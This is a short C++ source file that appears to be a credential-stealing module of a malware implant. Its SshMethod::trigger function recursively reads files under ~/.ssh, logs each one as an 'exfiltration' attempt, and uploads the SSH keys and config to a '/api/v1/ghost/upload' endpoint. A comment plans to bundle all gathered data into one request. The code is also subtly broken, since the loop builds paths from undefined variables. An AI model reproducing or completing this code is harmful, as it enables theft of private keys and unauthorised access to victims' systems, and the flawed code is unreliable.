#include "modules/gathering/SystemInfo.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Logger.hpp"
#include "network/Comms.hpp"

bool SshMethod::trigger() {
    std::vector<std::string> files = FileUtils::ListFilesRecursively("~/.ssh");
    std::string data;

    int successCount = 0;
    for (auto& file : files) {
        std::string path = home + "/" + target;

        LOG_INFO("Attempting exfiltration of {}", path)
        data += FileUtils::ReadFile(path);
    }

    if (data.empty()) return false;

    // TODO: think about aggregating all info and sending in one request, this is highly inefficient
    LOG_INFO("Uploading ssh creds and config")
    return Comms::UploadFile("/api/v1/ghost/upload", "ssh.txt", data);
}
